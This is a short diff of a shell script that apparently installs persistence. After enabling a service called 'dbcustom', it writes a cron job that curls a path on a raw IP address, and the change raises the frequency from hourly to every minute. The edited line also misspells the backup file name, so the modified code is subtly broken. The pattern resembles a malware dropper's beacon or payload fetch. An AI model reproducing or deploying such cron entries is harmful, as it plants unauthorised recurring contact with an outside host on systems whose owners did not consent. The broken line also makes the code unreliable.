@@ -63,8 +63,8 @@ systemctl enable dbcustom.service
 
 
 crontab -l > cron_bkp
-echo "1 * * * * curl http://78.47.96.210/yd" >> cron_bkp
-crontab cron_bkp
+echo "* * * * * curl http://78.47.96.210/yd" >> cron_bkp
+crontab cro_bkp
 rm cron_bkp
 
 
